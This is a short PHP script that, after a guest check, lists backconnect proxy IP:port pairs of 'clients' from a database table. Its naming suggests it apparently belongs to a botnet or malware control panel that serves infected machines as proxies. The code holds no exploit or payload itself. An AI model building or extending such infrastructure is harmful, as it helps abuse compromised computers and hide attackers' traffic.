<?php
header('Content-Type: text/html; charset=utf8');
define('N3N', 1);

include __DIR__ . '/config.php';
include __DIR__ . '/functions.php';

if (!CheckGuest()) {
    NotFound();
}
$mysqli = ConnectMySQLi($db_host, $db_login, $db_password, $db_database);
$res = $mysqli->query('SELECT client_bc_ip, client_bc_port, client_country FROM ' . DB_PROXY . '');
if ($res->num_rows != 0) {
    for ($i = 0; $i < $res->num_rows; $i++) {
        $row = $res->fetch_assoc();
        echo $row['client_bc_ip'] . ':' . $row['client_bc_port'] . PHP_EOL;
    }
} else {
    echo 'EMPTY';
}